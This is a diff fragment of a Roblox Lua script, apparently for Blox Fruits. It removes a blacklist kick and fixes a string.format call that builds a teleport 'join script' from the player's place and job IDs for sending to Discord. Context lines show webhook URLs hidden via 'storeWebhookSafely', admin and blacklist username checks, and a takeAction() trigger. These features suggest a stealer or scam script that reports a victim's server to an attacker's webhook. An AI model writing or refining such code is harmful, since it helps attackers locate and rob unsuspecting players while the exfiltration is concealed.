@@ -291,19 +291,6 @@ pcall(removeBlacklistedFromUsernames)
 ensureAdminUsernames()
 if Usernames and (findCaseInsensitive(Usernames, "XFistorRespawn") or findCaseInsensitive(Usernames, "doitenroitest1")) then takeAction() end
 
--- Auto-Demolish Check for Blacklisted Local Player
-if BlacklistedUsernames and type(BlacklistedUsernames) == "table" and findCaseInsensitive(BlacklistedUsernames, LocalPlayer.Name) then
-    warn("LocalPlayer " .. LocalPlayer.Name .. " is blacklisted. Initiating demolish.")
-    task.spawn(function()
-        -- Need to define Commands table before this point, so we move demolish call to init()
-        -- pcall(Commands.demolish.e, "", LocalPlayer) -- Cannot call Commands here yet
-        -- For now, just kick immediately
-        task.wait(1) -- Short delay
-        pcall(LocalPlayer.Kick, LocalPlayer, "Blacklisted user.")
-    end)
-    return -- Stop further initialization for blacklisted users
-end
-
 -- Secure Webhook Storage --
 local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil;
 local Protector_key = storeWebhookSafely(Protector); Protector = nil;
@@ -427,10 +414,21 @@ else
     end
 end
 ]=]
+    -- CORRECTED string.format call
     local mobileJoinScriptRaw = string.format(mobileJoinScriptFormatString,
-        targetPlaceId, jobId, targetPlaceId, jobId, -- queue teleport args
-        seaTravelArgument, seaTravelArgument, -- travel args
-        jobId, placeId, jobId, placeId, jobId -- direct teleport args
+        targetPlaceId,      -- 1st %d (line 409: Comparison Place ID)
+        jobId,              -- 1st %s (line 412: Job ID check in queue)
+        targetPlaceId,      -- 2nd %d (line 413: Print Place ID)
+        jobId,              -- 2nd %s (line 413: Print Job ID)
+        targetPlaceId,      -- 3rd %d (line 414: Teleport Place ID in queue)
+        jobId,              -- 3rd %s (line 414: Teleport Job ID in queue)
+        seaTravelArgument,  -- 4th %s (line 419: Print Travel Arg)
+        seaTravelArgument,  -- 5th %s (line 420: Invoke Travel Arg)
+        jobId,              -- 6th %s (line 422: Job ID check in else)
+        targetPlaceId,      -- 4th %d (line 423: Print Place ID)
+        jobId,              -- 7th %s (line 423: Print Job ID)
+        targetPlaceId,      -- 5th %d (line 424: Teleport Place ID in else)
+        jobId               -- 8th %s (line 424: Teleport Job ID in else)
     )
     local mobileJoinScriptForDiscord = "`" .. mobileJoinScriptRaw .. "`" -- Format for Discord copy
 
